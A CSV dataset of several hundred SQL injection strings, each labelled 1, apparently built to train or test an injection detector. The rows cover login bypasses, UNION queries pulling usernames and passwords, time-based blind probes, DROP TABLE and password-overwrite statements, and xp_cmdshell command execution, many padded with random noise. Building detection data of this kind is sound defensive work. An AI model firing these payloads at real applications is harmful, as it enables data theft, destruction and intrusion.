Sentence,Label
"admin"" UNION SELECT 1,2,3-- AND 1=1957725837790",1
2' OR '2' = '2163254667174,1
"admin"" UNION SELECT NULL,NULL,NULL---- AND 1=1/*/*",1
"test' UNION SELECT username,password FROM users--/*836#566",1
1' OR '1'='1' --/*612 AND 1=1#988--,1
"1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1 AND 1=1#--246",1
admin'%20OR%20'1'='1811,1
"""%20or%201=1# AND 1=1278 OR 1=1",1
"test1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=157437 OR 1=1133",1
'/**/OR/**/'a'='a922980622971481,1
"1' UNION SELECT username,password FROM users--652576 OR 1=1",1
"test"" UNION SELECT NULL,NULL--/* AND 1=1/*/*334",1
user' OR 1=1/*/* AND 1=1--906,1
"""%20or%201=1/*#",1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29-- AND 1=1/* AND 1=1,1
"admin' UNION SELECT NULL,NULL--#252",1
"user' UNION SELECT NULL,NULL,NULL--805 OR 1=1 AND 1=1 OR 1=1918",1
"1"" OR ""1"" = ""1 AND 1=1742395#150",1
"test' UNION SELECT 1,2,3----/*",1
"test"" UNION SELECT 1,2,3--/*10 AND 1=1# AND 1=1799",1
'%20or%201=1--969 OR 1=1 AND 1=1623,1
1'%09AND%09pg_sleep(5)--860513 OR 1=1372,1
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--408298--824",1
user') OR 1=1-- AND 1=1882350307/*,1
"""%20or%201=1#428/*170",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--892",1
"1' UNION SELECT NULL,column_name FROM information_schema.columns--",1
"admin"" UNION ALL SELECT NULL--24127474161832",1
' OR '2'='213973 AND 1=1--53-- AND 1=1386,1
' OR '1'='1 AND 1=1 OR 1=1----492,1
"user"" UNION SELECT 1,2,3-- AND 1=1749546",1
'; update users set password='hacked'-- AND 1=1-- AND 1=1,1
admin' UNION SELECT NULL-- AND 1=1#645270629434,1
"1'+UNION+SELECT+NULL,column_name+FROM+information_schema.columns--",1
test' UNION ALL SELECT NULL--954683888,1
"admin""/**/OR/**/1=1--/*",1
admin%27%20OR%20%271%27%3D%27120 AND 1=1#87151821,1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815#318",1
""")+OR+(""1""=""1 AND 1=1875516",1
'/**/OR/**/'1'='1'/**//*589 OR 1=1 AND 1=1501951,1
1'%20OR%201%20=%201575409713884,1
11' OR 1 = 1/*57,1
2' OR '2' = '2163254#820 AND 1=1,1
"""; UPDATE USERS SET PASSWORD=""HACKED""--69164 OR 1=1#619",1
11' OR '1' = '1/* OR 1=1976,1
"user"" OR 1=1/*/* AND 1=1/*--",1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659--282712",1
"' union select null,null,null--860804",1
""" OR 1=1#-- OR 1=1# AND 1=1663",1
10x27; WAITFOR DELAY 0x2700:00:050x27----928557,1
1' OR '1'='1 OR 1=1257--57050396#,1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29-- AND 1=1 OR 1=1,1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/* OR 1=1",1
1' OR 'a'='a544#--436,1
"99"" OR 99 = 99 OR 1=1",1
') OR ('1'='1/*--384519,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311# OR 1=1260",1
""" or 2=2/* AND 1=1 OR 1=1781359",1
""" OR ""2""=""2277272",1
1' OR '1'='1' --#57 OR 1=1901 OR 1=1267,1
'%20or%201=1#/* OR 1=1#/*,1
user') OR 1=1-- AND 1=1882350307# OR 1=1#,1
' OR 1=1#/* AND 1=1 OR 1=1,1
1' OR 'a'='a OR 1=1512,1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799350230",1
"admin' UNION SELECT username,password FROM users-- AND 1=1 OR 1=1 AND 1=160827870",1
"1'; INSERT INTO users VALUES('hacked','pass')---- OR 1=1 OR 1=1",1
')+OR+('1'='1 AND 1=1 OR 1=1556,1
testadmin' OR '1'='1 AND 1=1613186499236,1
' or 2=2/* AND 1=1/*253,1
' OR '1'='1' ---- OR 1=1,1
' UNION SELECT NULL--/*622/*427/*515 OR 1=1907,1
""" OR ""1""=""1 AND 1=1395 OR 1=1",1
"admin"" UNION SELECT 1,2,3---- OR 1=1",1
user' OR '1'='1#315-- AND 1=1 OR 1=1-- OR 1=1,1
admin1' OR '1' = '1--/*603#937149995915 AND 1=1,1
"testadmin"" OR ""1""=""1 AND 1=1613----#649",1
'%20or%201=1# AND 1=1368736,1
"""%20or%201=1/*21#",1
"""/**/OR/**/""1""=""1""/**/-- OR 1=1575518 AND 1=1",1
' or 2=2/* AND 1=1200,1
"""%20or%201=1/*835/*#442 OR 1=1",1
useradmin' OR 1=1--#/*606171457452,1
admin%27%20OR%20%271%27%3D%27120 AND 1=140868254,1
1' OR 'a'='a OR 1=1#38188,1
1%27%3B%20DROP%20TABLE%20users--/*678,1
1';%09DROP%09TABLE%09users--#,1
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1/*/*948,1
""" UNION SELECT NULL,NULL,NULL--/*743",1
admin' UNION ALL SELECT NULL----# AND 1=1691830,1
"admin1"" OR ""1"" = ""1# OR 1=1/*6772147014",1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=133#249,1
"""+OR+1=1#/*-- AND 1=1448",1
' OR 1=1#----#184137850455,1
"user"") OR (""1""=""1 AND 1=1 AND 1=1 OR 1=1840",1
""" OR 1=1/*--929888/*",1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1 AND 1=1--",1
'+UNION+SELECT+NULL--/*,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311# OR 1=1#927 AND 1=1851/*",1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1515/*404",1
1'----101--/*799 OR 1=1,1
11' OR '1' = '1/*164,1
"admin1' UNION SELECT NULL,table_name FROM information_schema.tables--813968#929",1
';+EXEC+xp_cmdshell('dir')-- AND 1=1--247677,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1889141 OR 1=1843",1
"testadmin"" OR 1=1-- AND 1=1 AND 1=1193",1
"""%20or%201=1-- OR 1=1793",1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1 AND 1=1435824,1
admin0x27/* OR 1=1 AND 1=1955--,1
useradmin' OR 1=1-- AND 1=1257839,1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*--223",1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659--282242",1
"admin' UNION SELECT NULL,NULL,NULL--/*#444161",1
"1"" OR ""1""=""1"" --#412640681798",1
"test' UNION SELECT 1,2,3-- AND 1=1512--",1
"1' UNION SELECT NULL,NULL----823",1
1' UNION SELECT NULL----395225 OR 1=1,1
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1/*476860/*210,1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables----418 OR 1=19154",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--# AND 1=1# OR 1=1953",1
"adminadmin"" OR ""1""=""1/*--/*217 OR 1=1 OR 1=1#",1
1%27%3B%20DROP%20TABLE%20users--/*277--,1
"test"" OR 1=1##933102/*753 AND 1=1631310",1
' or 2=2--/*395,1
"' union select null,null,null--# AND 1=1--682 AND 1=1",1
1admin' OR 1=1--#951359987,1
'%20or%201=1/*835257/* OR 1=1211,1
%27%20or%201%3D1/%2A,1
"""%20or%201=1/*21900",1
'+or+1=1#65,1
"""/**/OR/**/1=1-- OR 1=1/*857 AND 1=1782",1
1' OR 1=1/*/*715,1
user' OR 1=1/*/* AND 1=1339,1
""" OR ""1""=""1 AND 1=1395--",1
admin%27%20OR%20%271%27%3D%27120 AND 1=140 AND 1=1#,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311# OR 1=1 AND 1=1",1
ADMIN'/*--672234,1
""")+OR+(""1""=""1 AND 1=1875#34382",1
"""%20or%201=1/*835257/* OR 1=1 AND 1=1781",1
admin' OR 1=1#/*120637/*637350,1
10x27--144,1
') OR ('1'='1/* OR 1=1--/*248182 AND 1=1,1
') OR ('2'='2 OR 1=1593,1
""" OR ""2""=""213 AND 1=1/*26727 AND 1=1268",1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1/*/* OR 1=1787",1
""" OR ""1""=""1 AND 1=1395#",1
"1' UNION SELECT 1,2,3-- AND 1=1952 AND 1=1#",1
"test1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=157437971",1
0x27) OR 1=1--# AND 1=1--232,1
'+OR+1=1#/*-- AND 1=1725,1
"99'; INSERT INTO users VALUES('hacked','pass')--37281667561--",1
'/**/OR/**/1=1-- OR 1=1 AND 1=1 OR 1=1 OR 1=1683,1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1-- OR 1=1#--350",1
11' OR '1' = '1/*378,1
1'%09AND%09pg_sleep(5)--860513 OR 1=1723925,1
1'%20AND%20pg_sleep(5)--533872437458280,1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--#/*373",1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=1309718793",1
"testadmin"" OR ""1""=""1 AND 1=1613186#--",1
' AND 2=CAST((SELECT @@version) AS int)--881963 OR 1=1/*--,1
1'%09AND%09pg_sleep(5)--860 OR 1=125816#452791,1
"""%20or%201=1/*835 OR 1=1 OR 1=1505",1
')+OR+('1'='1 AND 1=1875753,1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1 AND 1=1232852,1
"test1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=157/* AND 1=1",1
"test"" UNION SELECT 1,2,3-- AND 1=1512 AND 1=1#793#367",1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815#230",1
1' OR '1'='1' -- AND 1=1 OR 1=1,1
"admin"" OR 1=1--/* OR 1=1837",1
"test"" OR 1=1##933102#/*986 OR 1=1/*",1
"admin"" OR ""1""=""1 AND 1=1998703",1
1'%20OR%201%20=%201--,1
"test' UNION SELECT 1,2,3--/*10 AND 1=153",1
1' OR 'a'='a OR 1=1#38983,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311# OR 1=1#347",1
'; ExeC XP_cmdSheLl('Dir')---- AND 1=1,1
ADMIN'/*172620 OR 1=1--,1
1'----101--/*799 AND 1=1,1
' or 2=2----973742,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739 AND 1=1567/*956",1
admin'/*451963,1
' UNION ALL SELECT NULL--/*610,1
testadmin' OR '1'='1#62434,1
admin' UNION SELECT NULL-- AND 1=1#645/*735909#,1
test' OR '1'='1' --/*,1
"1""%09AND%09pg_sleep(5)--860513 OR 1=1723/*#",1
"testadmin"" OR ""1""=""1 AND 1=1613----#/*",1
';/**/DROP/**/TABLE/**/users-- OR 1=1,1
%2527%2520UNION%2520SELECT%25201%252C2%252C3--292,1
"""/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138344912842663",1
"0x27 AND 1=CONVERT(int,(SELECT @@version))--",1
aDMin'/* OR 1=1/*#392 OR 1=1,1
admin0x27/*467468 OR 1=1708142414,1
admin0x27/*58763508966,1
"admin1"" OR ""1"" = ""1# AND 1=1#785489831--3",1
'/**/OR/**/'1'='1'/**/-- OR 1=1575518 OR 1=1,1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1/*524",1
1%27%3B%20DROP%20TABLE%20users--/*586 AND 1=1 OR 1=1846,1
"1"" OR ""1""=""1"" --#412640",1
'/**/OR/**/1=1-- OR 1=1876--/*--20729,1
') OR ('1'='1/* OR 1=1--326 AND 1=1618,1
testadmin' OR '1'='1 AND 1=1 OR 1=1 OR 1=1/* AND 1=1/*--323,1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#423/*179",1
test' OR 1=1#/*#889 AND 1=1,1
"user"") OR (""1""=""1--167387#169",1
admin' UNION ALL SELECT NULL-- AND 1=1805#,1
test1' OR '1' = '1/*#63257751--,1
""" OR ""1""=""1"" /*##256611",1
"""%20or%201=1#428/*61--",1
admin' OR 1=1-- AND 1=165615,1
"test' UNION SELECT 1,2,3--/*#974#754 OR 1=1",1
"admin1' UNION SELECT NULL,table_name FROM information_schema.tables--523",1
')%20OR%201=1--89,1
"1"" UNION SELECT NULL----395--",1
"test"" OR 1=1##933993816",1
"test' UNION SELECT username,password FROM users--/*836#653",1
user' OR 'a'='a----870,1
admin' UNION SELECT NULL-- AND 1=1#645270782,1
2' AND SLEEP(5)--761163#,1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1379/*",1
"admin"" UNION SELECT username,password FROM users-- AND 1=1/*",1
user') OR ('1'='1--167387715705,1
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=116,1
"useradmin"" OR ""1""=""1-- OR 1=1 OR 1=1",1
"user"") OR (""1""=""157",1
'+or+1=1# OR 1=1 AND 1=1 OR 1=1-- OR 1=1,1
' OR '2'='2 AND 1=1 AND 1=1--173--658457,1
%2527%2520UNION%2520SELECT%25201%252C2%252C3--614354,1
""" OR 1=1#-- OR 1=1#805696",1
"test1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=157437#",1
"user"") OR (""1""=""1#",1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1497352#",1
"user"" UNION SELECT NULL,NULL--/*958671/*",1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594286",1
10x27; WAITFOR DELAY 0x2700:00:050x27----975,1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1515/*604",1
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables-- OR 1=1-- OR 1=1",1
"' UNION SELECT USERNAME,PASSWORD FROM USERS-- AND 1=1",1
') OR ('1'='1/* OR 1=1--/*248182232,1
test' OR '1'='1' --#,1
"test1"" OR ""1"" = ""1/*# AND 1=1--63118384",1
"1'; INSERT INTO users VALUES('hacked','pass')--739 AND 1=1 AND 1=1--",1
admin'#95,1
user' OR '1'='1' /*--,1
""";%20EXEC%20xp_cmdshell(""dir"")--591 AND 1=1108",1
"1"" OR ""1"" = ""1-- OR 1=1#20 OR 1=1",1
' OR 1=1#--579,1
"1'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1 AND 1=1 OR 1=1-- AND 1=1/*587",1
1' OR 1=1#-- AND 1=1 AND 1=1,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=1370680117",1
"1'; INSERT INTO users VALUES('hacked','pass')--739--353# OR 1=1--766",1
1' UNION ALL SELECT NULL-- AND 1=1126# OR 1=1,1
' OR '2'='213/*# OR 1=1#,1
test' OR 1=1##933102824,1
user') OR ('1'='1--167387709,1
' OR '2'='2/*785/*--,1
1' OR '1'='1 OR 1=1 AND 1=1579404,1
') OR ('1'='1/* AND 1=1967#--,1
'%09or%091=1# AND 1=1 OR 1=1203838,1
"99"" OR 99 = 99 OR 1=1#/*5 OR 1=1 OR 1=1",1
"""; UPDATE USERS SET PASSWORD=""HACKED""--69164 AND 1=1695",1
"1"" OR ""a""=""a",1
admin1' OR '1' = '1--/*603#937#,1
') OR ('1'='1/*839/* OR 1=1,1
admin' OR 1=1/*--863 AND 1=1---- AND 1=1/*,1
"1' AND BENCHMARK(5000000,MD5('A'))-- AND 1=1",1
"test1"" OR ""1"" = ""1/*# AND 1=1--631480",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1222",1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761----",1
')+OR+('1'='1116,1
"1"" OR ""1"" = ""1 AND 1=1##148",1
testadmin' OR '1'='1 AND 1=1613186499320,1
"test"" UNION SELECT 1,2,3-- AND 1=1512577896/*",1
"99'; INSERT INTO users VALUES('hacked','pass')--",1
"useradmin"" OR ""1""=""1-- OR 1=1125-- AND 1=1",1
99' OR 99 = 99 OR 1=1#872 AND 1=1,1
"admin""%20OR%20""1""=""1 AND 1=1987656414589450",1
'%20or%201=1# AND 1=1368 AND 1=1,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=1370680467",1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1----773766",1
%27%20OR%20%271%27%3D%271%27%20--177,1
'%20OR%20'a'='a,1
admin1' OR '1' = '1--279# AND 1=1 OR 1=1693,1
1'%09AND%09pg_sleep(5)--860 OR 1=125816##227,1
""") OR (""1""=""1/* OR 1=1/* OR 1=1491",1
"11' UNION SELECT NULL,table_name FROM information_schema.tables--/*--/*481474",1
' AND 2=CAST((SELECT @@version) AS int)--#373 OR 1=1904,1
""" AND 2=CAST((SELECT @@version) AS int)--881963 OR 1=1/*235",1
admin' OR 1=1-- AND 1=1/*,1
ADMIN'/* AND 1=1----436,1
'%09or%091=1# AND 1=1 OR 1=1 AND 1=1/*,1
%2527%2520AND%25201%253DCAST%2528%2528SELECT%2520%2540%2540version%2529%2520AS%2520int%2529--61,1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1 AND 1=1",1
"test' UNION SELECT NULL,NULL--/*978141",1
' OR '1'='1' --/*#,1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278#110",1
""" OR 1=1/*--929888525",1
"admin"" OR 1=1/*--##653",1
"test' UNION SELECT 1,2,3--/*#974 OR 1=1417 OR 1=1--",1
admin1' OR '1' = '1--,1
' UNION SELECT NULL--/*622/*--771,1
admin' UNION ALL SELECT NULL--24127/*,1
admin' UNION SELECT NULL-- AND 1=1#645572,1
"""%09UNION%09SELECT%091,2,3--600",1
0x27; DROP TABLE users--,1
"' AND extractvalue(99,concat(0x7e,version()))-- OR 1=1--",1
') OR ('1'='1/* OR 1=1--/*248642668,1
admin' UNION SELECT NULL----607#94,1
"' union select null,null,null--552334",1
test' OR 1=1##/*#600841#,1
admin' OR 1=1/*#104116,1
"1"" UNION SELECT NULL----395 OR 1=1",1
%27%29%20OR%201%3D1--#,1
"""+OR+1=1#/*# AND 1=1/*#/*/* OR 1=1 OR 1=1#",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1889790",1
"admin"") OR (""1""=""1# OR 1=1 AND 1=1",1
"1"" OR ""a""=""a AND 1=1803635",1
"""+OR+""1""=""1--499",1
"user"") OR 1=1-- AND 1=1882350307465 AND 1=1/*",1
"admin"" UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1#631",1
"1'; INSERT INTO users VALUES('hacked','pass')--739--353# OR 1=1--675",1
"1""%20AND%20pg_sleep(5)--533872287 OR 1=1 OR 1=1",1
"1"" UNION SELECT NULL,NULL--# OR 1=198429",1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*#--726",1
'%20or%201=1# OR 1=1155,1
0x27) OR 1=1--# AND 1=1 OR 1=1304,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1679# AND 1=1",1
' OR '2'='213/*278,1
1'----101722,1
'/**/OR/**/'a'='a922980622458,1
' OR '1'='1' /* AND 1=1,1
admin0x27/*467468 OR 1=1708142704,1
0x27; EXEC xp_cmdshell(0x27dir0x27)-- AND 1=1,1
"user"" OR ""1""=""1#-- OR 1=1/*",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=1370276",1
"admin"" OR 1=1-- OR 1=1 AND 1=1 AND 1=178",1
1'%20AND%20pg_sleep(5)--533872437/*146767,1
"admin"" OR 2=2--925",1
"1"" OR 1=1/*##",1
"test1"" OR ""1"" = ""1/*#632",1
""" OR ""2""=""2 AND 1=1 AND 1=1--173----",1
"user"" OR ""1""=""1#315-- AND 1=1/*619",1
"ADMIN""/*17253168 AND 1=1",1
user' OR '1'='1#315-- AND 1=1 OR 1=1/*,1
"99"" OR 99 = 99 OR 1=1# OR 1=1700",1
' OR '2'='213/*75,1
') OR ('2'='2 OR 1=177236,1
' OR '1'='1#358--,1
"1"" UNION SELECT NULL----159667--#",1
';%20EXEC%20xp_cmdshell('dir')--591/*,1
' UNION SELECT NULL--/*622/*427/*25640770585,1
ADMIN'/*172620849196533--641,1
ADMIN'/* AND 1=1--# OR 1=1,1
'/**/OR/**/'1'='1'/**/--200,1
'; UPDATE USERS SET PASSWORD='HACKED'--69164/*,1
admin' UNION SELECT NULL-- AND 1=1#36204,1
admin'%20OR%20'1'='1 AND 1=1987 OR 1=1340,1
"admin"" UNION SELECT NULL,NULL--#534",1
'/**/OR/**/'1'='1'/**/--/*104,1
'/**/OR/**/'1'='1'/**/--/*75157 OR 1=1#348,1
ADMIN'/*172620279/*,1
"1""; WAITFOR DELAY ""00:00:010""--866",1
'/**/OR/**/1=1-- OR 1=1 OR 1=1581,1
"""%20or%201=1# AND 1=1 OR 1=1447239",1
admin1' OR '1' = '1--/*603#937272503,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=1235",1
' UNION SELECT NULL--/*622/*427/*2564044015,1
"1"";%20WAITFOR%20DELAY%20""00:00:05""--12 OR 1=1#",1
"user' UNION SELECT NULL,NULL--# OR 1=1/*655#",1
"1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1 AND 1=1#--610",1
"admin"" OR ""99""=""99 OR 1=1809 AND 1=1 OR 1=1 AND 1=1",1
"admin"" UNION SELECT 1,2,3-- AND 1=1957/*503",1
"99"" OR 99 = 99 OR 1=1#/*307803179",1
' OR '2'='213/*65,1
' OR 1=1#-- OR 1=1#810437/*,1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=179966249",1
admin0x27/*467468 OR 1=1708295,1
"useradmin"" OR ""1""=""1-- OR 1=1600--",1
"admin1"" UNION SELECT NULL,table_name FROM information_schema.tables--813/*",1
""" OR 1=1--# OR 1=1",1
"admin"" UNION SELECT NULL,NULL--897514154 OR 1=1 OR 1=1/* AND 1=1",1
admin' OR 1=1--/*82,1
"1'; INSERT INTO users VALUES('hacked','pass')--739-- AND 1=1",1
1' OR 1=1#-- AND 1=1208--,1
"""+OR+1=1#/*# AND 1=1/*#/*/* OR 1=1",1
"""/**/or/**/1=1/* AND 1=1 AND 1=1 OR 1=1",1
"1"" UNION SELECT NULL,NULL------611--306493# AND 1=1",1
test' OR 1=1##/* OR 1=1--660,1
aDMin'/* OR 1=1/*878,1
';+EXEC+xp_cmdshell('dir')-- AND 1=1#,1
"test1"" OR ""1"" = ""1/*#453",1
admin' OR 2=2--92534832,1
"user"") OR (""1""=""1 AND 1=1626468578",1
"1"" OR ""1"" = ""1--81796/*",1
1'%20OR%20'1'%20=%20'1918316,1
"admin"" UNION SELECT 1,2,3-- AND 1=1957/* OR 1=1",1
""" OR 1=1#----### AND 1=1",1
test1' OR 1 = 1# OR 1=151663,1
"""+UNION+SELECT+NULL--608861273--",1
"test' UNION SELECT 1,2,3--/*#853",1
user' OR 1=1/*/* AND 1=1--/*,1
admin'%20OR%20'1'='1 AND 1=1987656414589292482,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=163",1
'/**/OR/**/'a'='a922980622971/*381221,1
'+OR+1=1#/*160 OR 1=1,1
admin%27%20OR%20%271%27%3D%27120 AND 1=1#871703,1
' OR '2'='2 OR 1=1--,1
"1"" UNION SELECT NULL,NULL,NULL--14992614",1
'%20or%201=1/*83525738383159988 OR 1=1/*,1
' OR '1'='1' --/* AND 1=1/*,1
' OR '2'='2 AND 1=1795,1
' OR 99=99# OR 1=131,1
admin' OR 1=1-- AND 1=1173982,1
"""%20UNION%20ALL%20SELECT%20NULL--908518175",1
""" AND extractvalue(1,concat(0x7e,version()))--161/* OR 1=1",1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1 AND 1=1",1
1' OR '1'='1' --/*612 AND 1=1#/*753,1
"1' UNION SELECT 1,2,3-- AND 1=1--589596",1
"""/**/OR/**/""1""=""1""/**//*589 OR 1=1 AND 1=1501 AND 1=1",1
"99'; INSERT INTO users VALUES('hacked','pass')--372816#--252696768",1
admin' OR 1=1/*## OR 1=1349/*,1
"1"" OR ""1"" = ""1-- OR 1=1948",1
user') OR ('1'='1--#--339,1
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1/*/*166,1
"1"" OR 1=1/*# OR 1=1/* AND 1=1482",1
adminadmin' OR 1=1--#,1
"""/**/UNION/**/SELECT/**/NULL,NULL,NULL--306300781",1
';%20WAITFOR%20DELAY%20'0:0:5'--917983,1
"' union select null,null,null--# AND 1=1--#",1
"1"" OR ""1"" = ""1 AND 1=1742395401/*",1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878 OR 1=1 AND 1=1",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--198/*727",1
2'; DROP TABLE users-- OR 1=1,1
'/**/OR/**/'1'='1'/**//*589 OR 1=1 AND 1=1780,1
' OR '1'='1#474225 AND 1=1,1
"user"") OR 1=1-- AND 1=1882350307#",1
' or 2=2/*36752#,1
"""%20UNION%20SELECT%20NULL,NULL,NULL--511138/*",1
""" UNION SELECT NULL--/*622/*#",1
'%20AND%201=CAST((SELECT%20@@version)%20AS%20int)--#,1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815 OR 1=1 OR 1=1351",1
""" OR ""2""=""2 AND 1=1 AND 1=1--173 AND 1=1",1
"user"") OR 1=1-- AND 1=1882350307465 AND 1=1 AND 1=1 OR 1=1",1
"test' UNION SELECT 1,2,3-- AND 1=1512387",1
""" UNION SELECT NULL--/*622/*427/*515",1
"test' UNION SELECT username,password FROM users--/*#/*#63",1
'+OR+'1'='1--#,1
')+OR+('1'='1 AND 1=1289,1
admin') OR 1=1--# AND 1=1116,1
admin%27--/*,1
' OR '2'='2 AND 1=1 AND 1=1--173--543,1
"user' UNION SELECT 1,2,3-- AND 1=1809 OR 1=1 AND 1=1",1
' OR '1'='1#474620,1
'+OR+'1'='1--549 OR 1=1899,1
' OR '1'='1 AND 1=1 OR 1=1--/*,1
"user"" UNION SELECT NULL-- AND 1=1315",1
"admin1' UNION SELECT NULL,table_name FROM information_schema.tables--813968#69",1
""" UNION ALL SELECT NULL--/* AND 1=1964777207",1
test' OR 1=1#/*# AND 1=1--,1
""")%20OR%201=1--/*",1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--# OR 1=18432#",1
'%20or%201=1--969 OR 1=1/*215 OR 1=1320,1
admin' OR 1=1/*#--,1
0x27; UPDATE users SET password=0x27hacked0x27--96,1
admin' OR '1'='1' /* AND 1=1452#439,1
"admin"" UNION SELECT NULL,NULL,NULL--/*517488",1
%27%20UNION%20SELECT%20NULL--/*,1
""" AND extractvalue(1,concat(0x7e,version()))--161/*233/*",1
1%27%3B%20INSERT%20INTO%20users%20VALUES%28%27hacked%27%2C%27pass%27%29--#14,1
"' union select null,null,null--# AND 1=1--491/*",1
"admin"" UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1993",1
') OR ('1'='1/* OR 1=1--326369,1
ADMIN'/* AND 1=1--183,1
"1'; INSERT INTO users VALUES('hacked','pass')--739-- OR 1=1518/*",1
"""+UNION+SELECT+NULL--608690#",1
